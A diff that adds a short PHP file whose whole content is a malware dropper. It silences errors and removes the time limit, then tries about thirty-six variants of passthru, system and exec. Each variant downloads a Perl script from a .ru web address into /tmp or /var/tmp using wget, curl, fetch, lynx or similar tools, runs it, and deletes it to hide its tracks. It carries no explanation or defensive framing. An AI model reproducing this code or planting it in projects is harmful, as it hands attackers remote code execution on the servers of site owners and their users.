@@ -1,0 +1,37 @@
+<?
+set_time_limit(0);
+error_reporting(0);
+@passthru('cd /tmp;wget http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@passthru('cd /tmp;curl -O http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@passthru('cd /tmp;lwp-download http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@passthru('cd /tmp;lynx -source http://www.farvater-okna.ru/images/zero >zero;perl zero;rm -f zero*');
+@passthru('cd /tmp;fetch http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@passthru('cd /tmp;GET http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@passthru('cd /var/tmp;wget http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@passthru('cd /var/tmp;curl -O http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@passthru('cd /var/tmp;lwp-download http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@passthru('cd /var/tmp;fetch http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@passthru('cd /var/tmp;GET http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@system('cd /tmp;wget http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@system('cd /tmp;curl -O http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@system('cd /tmp;lwp-download http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@system('cd /tmp;lynx -source http://www.farvater-okna.ru/images/zero >zero;perl zero;rm -f zero*');
+@system('cd /tmp;fetch http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@system('cd /tmp;GET http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@system('cd /var/tmp;wget http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@system('cd /var/tmp;curl -O http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@system('cd /var/tmp;lwp-download http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@system('cd /var/tmp;fetch http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@system('cd /var/tmp;GET http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@exec('cd /tmp;wget http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@exec('cd /tmp;curl -O http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@exec('cd /tmp;lwp-download http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@exec('cd /tmp;lynx -source http://www.farvater-okna.ru/images/zero >zero;perl zero;rm -f zero*');
+@exec('cd /tmp;fetch http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@exec('cd /tmp;GET http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@exec('cd /var/tmp;wget http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@exec('cd /var/tmp;curl -O http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@exec('cd /var/tmp;lwp-download http://www.farvater-okna.ru/images/zero;perl zero;rm -f zero*');
+@exec('cd /var/tmp;fetch http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+@exec('cd /var/tmp;GET http://www.farvater-okna.ru/images/zero > zero;perl zero;rm -f zero*');
+?>
